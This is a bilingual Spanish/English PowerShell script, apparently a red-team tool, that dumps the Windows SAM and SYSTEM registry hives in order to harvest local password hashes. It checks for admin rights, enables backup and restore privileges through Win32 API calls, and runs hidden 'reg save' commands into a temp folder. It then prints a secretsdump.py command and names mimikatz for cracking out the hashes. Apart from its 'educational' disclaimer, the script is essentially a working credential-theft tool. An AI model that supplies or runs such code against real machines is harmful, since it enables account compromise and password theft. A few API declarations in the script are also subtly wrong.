<#
.SYNOPSIS
    Script de volcado de la base de datos SAM de Windows
    Windows SAM Database Dumping Script

.DESCRIPTION
    Este script intenta volcar los hashes de contraseñas de la base de datos SAM local.
    Requiere privilegios de administrador o SYSTEM.
    This script attempts to dump password hashes from the local SAM database.
    Requires administrator or SYSTEM privileges.

.NOTES
    Autor: RedTeam-Bypass
    Versión: 1.0
    Propósito: Educativo / Pruebas de penetración autorizadas
    Purpose: Educational / Authorized Penetration Testing
    
    ADVERTENCIA: Este script es solo para uso educativo y pruebas de penetración autorizadas.
    WARNING: This script is for educational and authorized penetration testing only.
#>

#Requires -RunAs

# Agregar tipos necesarios de Windows API
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;

public class WinAPI {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);
    
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
    
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetCurrentProcess();
    
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct LUID {
        public uint LowPart;
        public int HighPart;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
        public uint PrivilegeCount;
        public LUID Luid;
        public uint Attributes;
    }
    
    public const uint TOKEN_QUERY = 0x0008;
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    public const string SE_BACKUP_NAME = "SeBackupPrivilege";
    public const string SE_RESTORE_NAME = "SeRestorePrivilege";
}
"@

function Write-Banner {
    Write-Host "================================================" -ForegroundColor Cyan
    Write-Host "   Volcado de Base de Datos SAM - DumpSAM.ps1" -ForegroundColor Cyan
    Write-Host "   SAM Database Dump Tool" -ForegroundColor Cyan
    Write-Host "================================================" -ForegroundColor Cyan
    Write-Host ""
}

function Test-IsSystem {
    <#
    .SYNOPSIS
    Verifica si el script se ejecuta como NT AUTHORITY\SYSTEM
    #>
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    
    return $identity.User.Value -eq "S-1-5-18"
}

function Enable-Privilege {
    <#
    .SYNOPSIS
    Habilita un privilegio específico en el token del proceso actual
    #>
    param(
        [Parameter(Mandatory=$true)]
        [string]$PrivilegeName
    )
    
    try {
        $processHandle = [WinAPI]::GetCurrentProcess()
        $tokenHandle = [IntPtr]::Zero
        
        if (-not [WinAPI]::OpenProcessToken($processHandle, [WinAPI]::TOKEN_ADJUST_PRIVILEGES -bor [WinAPI]::TOKEN_QUERY, [ref]$tokenHandle)) {
            Write-Warning "No se pudo abrir el token del proceso: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
            return $false
        }
        
        $luid = New-Object WinAPI+LUID
        if (-not [WinAPI]::LookupPrivilegeValue($null, $PrivilegeName, [ref]$luid)) {
            Write-Warning "No se pudo buscar el privilegio $PrivilegeName"
            [WinAPI]::CloseHandle($tokenHandle) | Out-Null
            return $false
        }
        
        $tp = New-Object WinAPI+TOKEN_PRIVILEGES
        $tp.PrivilegeCount = 1
        $tp.Luid = $luid
        $tp.Attributes = [WinAPI]::SE_PRIVILEGE_ENABLED
        
        if (-not [WinAPI]::AdjustTokenPrivileges($tokenHandle, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero)) {
            Write-Warning "No se pudo ajustar los privilegios del token"
            [WinAPI]::CloseHandle($tokenHandle) | Out-Null
            return $false
        }
        
        [WinAPI]::CloseHandle($tokenHandle) | Out-Null
        Write-Host "[+] Privilegio $PrivilegeName habilitado exitosamente" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Warning "Error habilitando privilegio: $_"
        return $false
    }
}

function Get-SAMHashes {
    <#
    .SYNOPSIS
    Intenta obtener hashes de contraseñas del SAM usando reg.exe
    #>
    
    Write-Host "[*] Intentando volcar la base de datos SAM..." -ForegroundColor Yellow
    
    # Crear directorio temporal
    $tempPath = Join-Path $env:TEMP "SAMDump_$(Get-Random)"
    New-Item -ItemType Directory -Path $tempPath -Force | Out-Null
    
    try {
        # Exportar las claves de registro necesarias
        $samFile = Join-Path $tempPath "sam.hive"
        $systemFile = Join-Path $tempPath "system.hive"
        
        Write-Host "[*] Exportando clave de registro SAM..." -ForegroundColor Yellow
        $result = Start-Process -FilePath "reg.exe" -ArgumentList "save HKLM\SAM `"$samFile`"" -Wait -PassThru -WindowStyle Hidden
        
        if ($result.ExitCode -ne 0) {
            Write-Warning "No se pudo exportar la clave SAM. Código de salida: $($result.ExitCode)"
            Write-Host "[!] Asegúrese de ejecutar como Administrador o SYSTEM" -ForegroundColor Red
            return
        }
        
        Write-Host "[*] Exportando clave de registro SYSTEM..." -ForegroundColor Yellow
        $result = Start-Process -FilePath "reg.exe" -ArgumentList "save HKLM\SYSTEM `"$systemFile`"" -Wait -PassThru -WindowStyle Hidden
        
        if ($result.ExitCode -ne 0) {
            Write-Warning "No se pudo exportar la clave SYSTEM. Código de salida: $($result.ExitCode)"
            return
        }
        
        Write-Host "[+] Claves de registro exportadas exitosamente" -ForegroundColor Green
        Write-Host ""
        Write-Host "[*] Archivos generados:" -ForegroundColor Cyan
        Write-Host "    SAM:    $samFile" -ForegroundColor White
        Write-Host "    SYSTEM: $systemFile" -ForegroundColor White
        Write-Host ""
        Write-Host "[*] Para extraer los hashes, use herramientas como:" -ForegroundColor Yellow
        Write-Host "    - secretsdump.py (Impacket)" -ForegroundColor White
        Write-Host "    - samdump2" -ForegroundColor White
        Write-Host "    - mimikatz" -ForegroundColor White
        Write-Host ""
        Write-Host "[*] Ejemplo con secretsdump.py:" -ForegroundColor Cyan
        Write-Host "    secretsdump.py -sam `"$samFile`" -system `"$systemFile`" LOCAL" -ForegroundColor White
        
        # Información adicional sobre la estructura SAM
        Write-Host ""
        Write-Host "[*] Información de la Base de Datos SAM:" -ForegroundColor Cyan
        
        # Intentar leer información básica del registro
        try {
            $samKey = "HKLM:\SAM\SAM\Domains\Account"
            if (Test-Path $samKey) {
                Write-Host "[+] Clave SAM accesible" -ForegroundColor Green
            } else {
                Write-Host "[-] Clave SAM no directamente accesible (esperado)" -ForegroundColor Yellow
            }
        }
        catch {
            Write-Host "[-] No se puede acceder directamente a las claves SAM (esperado)" -ForegroundColor Yellow
        }
        
    }
    catch {
        Write-Error "Error durante el volcado: $_"
    }
    finally {
        Write-Host ""
        Write-Host "[*] Archivos de volcado guardados en: $tempPath" -ForegroundColor Cyan
        Write-Host "[!] Recuerde eliminar estos archivos cuando termine" -ForegroundColor Yellow
    }
}

function Get-SystemInfo {
    <#
    .SYNOPSIS
    Muestra información del sistema relevante para el volcado SAM
    #>
    
    Write-Host "[*] Información del Sistema:" -ForegroundColor Cyan
    Write-Host "    Computadora:        $env:COMPUTERNAME" -ForegroundColor White
    Write-Host "    Usuario actual:     $env:USERNAME" -ForegroundColor White
    Write-Host "    Dominio:            $env:USERDOMAIN" -ForegroundColor White
    
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    Write-Host "    SID:                $($identity.User.Value)" -ForegroundColor White
    
    if (Test-IsSystem) {
        Write-Host "    Ejecutando como:    NT AUTHORITY\SYSTEM" -ForegroundColor Green
    } else {
        Write-Host "    Ejecutando como:    Usuario con privilegios" -ForegroundColor Yellow
    }
    
    Write-Host ""
}

function Show-SAMDatabaseInfo {
    <#
    .SYNOPSIS
    Muestra información educativa sobre la base de datos SAM
    #>
    
    Write-Host "[*] Información sobre la Base de Datos SAM:" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "La base de datos Security Account Manager (SAM) contiene:" -ForegroundColor White
    Write-Host "  - Nombres de usuario locales" -ForegroundColor Gray
    Write-Host "  - Hashes de contraseñas (NT hash, LM hash obsoleto)" -ForegroundColor Gray
    Write-Host "  - SIDs (Security Identifiers)" -ForegroundColor Gray
    Write-Host "  - Membresías de grupos" -ForegroundColor Gray
    Write-Host ""
    Write-Host "Ubicación: HKLM\SAM\SAM\Domains\Account\Users" -ForegroundColor Gray
    Write-Host "Acceso:    Solo NT AUTHORITY\SYSTEM o con SeBackupPrivilege" -ForegroundColor Gray
    Write-Host ""
    Write-Host "Estructura de cifrado de hashes:" -ForegroundColor White
    Write-Host "  1. Hash MD4 de la contraseña (NT hash)" -ForegroundColor Gray
    Write-Host "  2. Cifrado DES con RID del usuario como clave" -ForegroundColor Gray
    Write-Host "  3. Cifrado con Password Encryption Key (PEK)" -ForegroundColor Gray
    Write-Host "  4. PEK cifrado con LSA System Key" -ForegroundColor Gray
    Write-Host ""
}

# ========================================
# Main Execution
# ========================================

Write-Banner
Get-SystemInfo

# Verificar privilegios de administrador
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "[!] ADVERTENCIA: Este script requiere privilegios de administrador" -ForegroundColor Red
    Write-Host "[!] Por favor, ejecute PowerShell como Administrador" -ForegroundColor Red
    exit 1
}

Write-Host "[+] Ejecutando con privilegios de administrador" -ForegroundColor Green
Write-Host ""

# Intentar habilitar privilegios de backup y restore
Write-Host "[*] Habilitando privilegios necesarios..." -ForegroundColor Yellow
Enable-Privilege -PrivilegeName "SeBackupPrivilege" | Out-Null
Enable-Privilege -PrivilegeName "SeRestorePrivilege" | Out-Null
Write-Host ""

# Mostrar información educativa
Show-SAMDatabaseInfo

# Preguntar al usuario si desea continuar
Write-Host "[?] ¿Desea continuar con el volcado de la base de datos SAM? (S/N): " -ForegroundColor Yellow -NoNewline
$response = Read-Host

if ($response -eq "S" -or $response -eq "s" -or $response -eq "Y" -or $response -eq "y") {
    Write-Host ""
    Get-SAMHashes
} else {
    Write-Host "[*] Operación cancelada por el usuario" -ForegroundColor Yellow
}

Write-Host ""
Write-Host "[*] Script completado" -ForegroundColor Cyan
